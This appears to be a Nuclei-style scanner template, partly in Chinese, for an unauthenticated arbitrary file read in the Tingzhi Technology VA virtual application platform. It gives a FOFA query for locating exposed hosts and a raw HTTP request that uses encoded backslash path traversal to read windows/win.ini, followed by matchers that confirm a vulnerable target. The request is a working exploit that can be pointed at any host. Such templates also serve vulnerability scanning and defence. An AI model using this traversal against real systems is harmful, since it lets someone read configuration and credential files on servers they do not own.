id: tingzhikeji-VA-File-reading

info:
  name: 霆智科技-VA虚拟应用平台 任意文件读取
  author: unknown
  severity: high
  description: |-
    fofa: body="EAA益和应用接入系统"
    霆智科技-VA虚拟应用平台存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

  tags: File reading


http:
  - raw:
      - |
        POST /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
        Content-Type: application/json

        {}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '; for 16-bit app support'
      - type: status
        status: 
          - 200